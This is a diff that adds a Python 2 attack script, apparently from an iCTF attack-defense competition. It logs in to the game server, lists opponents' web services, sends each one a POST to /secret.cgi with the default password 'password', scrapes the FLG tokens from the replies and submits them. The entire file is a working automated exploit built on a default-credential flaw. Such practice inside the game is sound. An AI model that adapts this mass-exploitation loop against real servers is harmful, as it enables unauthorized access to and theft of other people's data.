@@ -1,0 +1,57 @@
+#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+
+from ictf import iCTF
+import os
+import sys
+import httplib
+import commands
+import re
+import time
+
+from pwn import *
+
+argc = len(sys.argv)
+service_name = []
+with open("secret.txt", 'r') as f:
+    username = f.readline().strip()
+    passwd = f.readline().strip()
+i=iCTF("http://35.167.152.77/")
+t = i.login(username,passwd)
+
+services = t.get_service_list()
+
+print "Number of Services are:" + str(len(services))
+
+service_web = []
+
+for service in services:
+    if service['service_name'].find("web",0,len(service['service_name'])):
+        # print service['service_name']
+        service_name.append(service['service_name'])
+        service_web.append(service['service_id'])
+
+flags = ""
+
+for elem in service_web:
+    targets = t.get_targets(elem)
+    for target in targets['targets']:
+        try:
+            hostname  = target['hostname']
+            flag_id = target['flag_id']
+            port = target['port']
+            httpServ = httplib.HTTPConnection(hostname, port, timeout=1)
+            httpServ.connect()
+            httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(flag_id))
+            response = httpServ.getresponse().read()
+            flag = response.strip()
+            flag = re.findall("\FLG\w+", flag)
+            if len(flag) > 0:
+                flag = flag[0]
+                flags += flag + " "
+                t.submit_flag([flag])
+        except:
+            pass
+        finally:
+            httpServ.close()    
+print flags
